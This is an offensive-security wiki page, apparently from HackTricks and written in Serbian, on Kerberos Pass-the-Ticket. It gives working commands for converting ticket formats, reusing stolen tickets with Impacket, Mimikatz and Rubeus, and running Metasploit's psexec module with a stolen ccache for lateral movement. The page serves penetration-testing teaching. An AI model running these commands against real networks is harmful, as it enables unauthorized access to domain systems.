# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pregled

U Pass-the-Ticket (PtT) napadu, napadač koristi ukradeni Kerberos ticket za autentifikaciju kao principal tog ticketa, bez posedovanja lozinke tog naloga. Ticket-granting ticket (TGT) može da se koristi za zahtevanje service ticket-a, dok je ukradeni service ticket ograničen na ciljnu uslugu i period važenja.<sup>[[1]](#references)</sup>

Za tehnike pribavljanja ticket-a pogledajte:

- [Prikupljanje ticket-a iz Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Prikupljanje ticket-a iz Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Konvertovanje Linux i Windows formata ticket-a

Kerberos keš memorije se obično pojavljuju kao MIT `ccache` fajlovi u Linux-u i `.kirbi` fajlovi u Windows-u. `ticket_converter` konvertuje ove formate koristeći ulazni ticket i putanju za izlazni fajl.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo takođe pruža alatke za Kerberos tikete na Windows-u.<sup>[[3]](#references)</sup>

## Using a Ticket

Na Linux-u, postavite `KRB5CCNAME` da pokazuje na keš i podesite Impacket klijent da koristi Kerberos bez traženja lozinke:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Na Windows-u, Mimikatz ili Rubeus mogu da uvezu `.kirbi` ticket u trenutnu sesiju prijavljivanja. Koristite `klist` da pregledate rezultujući keš.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Uvoz ticket-a ne daje privilegije veće od onih koje ticket predstavlja i koje dozvoljava politika autorizacije ciljne usluge. Istekli, opozvani, neispravno oblikovani ili pogrešno ograničeni ticket-i možda neće raditi.<sup>[[1]](#references)</sup>

Za širi kontekst Kerberos napada i povezane tehnike pribavljanja ticket-a pogledajte Tarlogic-ov vodič za Kerberos napade.<sup>[[7]](#references)</sup>

### Ponovna upotreba eksternog ticket-a u Metasploit-u

Metasploit ne čita automatski `KRB5CCNAME` iz Impacket-a za svoje Kerberos module. Prosledite modulu **ccache datoteku** pomoću opcije `::Krb5Ccname` specifične za protokol. Podesite `::Rhostname` na SPN hostname cilja, a domen na domen cilja; `RHOST` i dalje može biti IP adresa cilja. Tako možete da koristite već pribavljeni ticket bez unošenja lozinke naloga.<sup>[[8]](#references)</sup>

Ako je potrebno, prvo konvertujte `.kirbi` u ccache.<sup>[[9]](#references)</sup>

Na primer, ako imate ticket za nalog koji može da kreira servise na cilju, pokrenite [SMB PsExec modul](../lateral-movement/psexec-and-winexec.md) pomoću te keš memorije:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit prvo bira odgovarajuću servisnu kartu iz dostavljenog keša. Ako pronađe samo TGT, zahteva servisnu kartu od KDC-a, pa je i za taj postupak potrebna veza sa DC-om. Keš koji sadrži samo servisnu kartu ne omogućava pristup nepovezanim hostovima. Za druge podržane module promenite prefiks opcije (na primer, `Winrm::Krb5Ccname` za [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Primeri za Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos tehnike napada](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Autentifikacija servisa](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Konvertovanje kirbi i ccache datoteka](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB klijent: Kerberos implementacija](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
